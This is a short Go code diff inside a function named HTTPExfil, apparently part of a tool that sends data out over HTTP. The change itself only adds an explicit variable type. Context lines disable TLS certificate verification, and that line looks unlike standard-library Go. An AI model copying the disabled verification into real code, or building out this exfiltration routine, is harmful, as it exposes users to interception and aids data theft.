@@ -280,7 +280,7 @@ func HTTPExfil(
 		var e error
 		var n int
 		var r *http.Request
-		var stream = bytes.NewReader(b)
+		var stream *bytes.Reader = bytes.NewReader(b)
 		var tmp [4 * 1024 * 1024]byte
 
 		http.DefaultClient.TLSClientConfig.InsecureSkipVerify = true
